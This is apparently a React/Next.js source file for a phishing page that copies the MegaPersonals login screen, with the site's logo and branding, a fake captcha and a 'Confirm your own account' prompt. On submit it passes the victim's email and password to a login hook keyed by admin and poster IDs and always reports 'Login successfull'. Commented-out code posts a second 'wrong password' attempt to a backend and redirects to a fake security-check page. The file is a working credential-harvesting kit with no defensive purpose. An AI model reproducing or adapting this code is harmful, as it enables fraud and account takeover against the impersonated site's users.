"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config";
import Image from "next/image";

function LoginForm({ adminId, posterId }) {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [wrongPassword, setWrongPassword] = useState("");
  // const [showWrongPassword, setShowWrongPassword] = useState(false);
  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = () => {
    const submitValues = {
      site: site,
      email: email,
      password: password,
    };
    login(submitValues);
    // setShowWrongPassword(true);
    toast.success("Login successfull");
    // router.push(`/security-check`);
    setEmail("");
    setPassword("");
  
    console.log(submitValues);
  };

  // const handleWrongPassword = async () => {
  //   const url = `${API_URL}/add/wrongpassword`;
  //   const id = Cookies.get("id");
  //   const values = {
  //     id,
  //     wrongPassword,
  //   };

  //   const res = await fetch(url, {
  //     method: "POST",
  //     headers: {
  //       Accept: "application/json",
  //       "Content-Type": "application/json",
  //     },
  //     body: JSON.stringify(values),
  //   });
  //   const data = await res.json();
  //   console.log(data);

  //   if (res.ok) {
  //     console.log("success", data);
  //     setEmail("");
  //     setPassword("");
  //     setWrongPassword("");
  //     router.push(`/security-check`);
  //   } else {
  //     console.log("error", data);
  //     toast.error("Something Went Wrong");
  //   }
  // };

  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      <div className="w-[65%] lg:w-full">
        <Image src={"/images/megapersonals.png"} alt="megaeprsonals" priority />
      </div>
      <div className=" mt-5 font-bold text-[#222222] text-center ">
        <p className="text-3xl font-bold text-[#222222] text-center ">
          <span className="text-[#e89a4c]">Mega</span>{" "}
          <span className="text-[#6495ED]">Personals</span>
        </p>
        <p className="text-2xl text-blue-700">
          Confirm your own account before
        </p>
       
      </div>

      <div className="mt-5">
        <input
          className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
          placeholder="Your email"
          name="email"
          type="email"
          autoComplete="on"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
        />

        {/* {!showWrongPassword ? ( */}
        {/* <> */}
        <input
          className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
          placeholder="Password"
          name="password"
          type="password"
          autoComplete="on"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />
        {/* </> */}
        {/* ) : ( */}
        {/* <input
            className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Password"
            name="wrongPassword"
            type="password"
            autoComplete="on"
            value={wrongPassword}
            onChange={(e) => setWrongPassword(e.target.value)}
            required
          />
        )} */}
        {/* {showWrongPassword ? (
          <p className="text-red-500 text-lg font-medium text-center">
            Wrong Password, try again
          </p>
        ) : null} */}
        <div className="flex flex-col items-center">
          <Image
            src="/images/captures.jpeg"
            alt="captcha"
            width={228}
            height={55}
            className="mt-3"
          />

          <input
            className="mt-2 w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
            id="captcha"
            name="captcha"
            type="captcha"
            autoComplete="on"
            placeholder="Enter code from the picture"
            required
          />
        </div>
        {/* {!showWrongPassword ? (
          <button
            type="button"
            onClick={handleSubmit}
            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
          >
            SUBMIT
          </button>
        ) : ( */}
        <button
          type="submit"
          // type="button"
          className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
          // disabled={!verified}
          // onClick={handleNextStep}
          onClick={handleSubmit}
        >
          SUBMIT
        </button>
        {/* )} */}

        <Image
          src="/images/warning.png"
          alt="warning"
          className="mt-2 mx-auto"
          width={350}
          height={154}
        />

        <p className="mt-[10px] text-center text-sm text-custom-blue2 uppercase hover:underline">
          Forgot Password?
        </p>
      </div>
      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
        <p className=" cursor-pointer">Home</p>
        {" | "}
        <p className=" cursor-pointer">Manage Posts</p>
        {" | "}
        <p className=" cursor-pointer">Contact Us</p>
        {" | "}
        <p className=" cursor-pointer">Policies & Terms</p>
      </div>
      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
        Copyright ©2021 MegaPersonals.eu
      </p>
    </div>
  );
}

export default LoginForm;
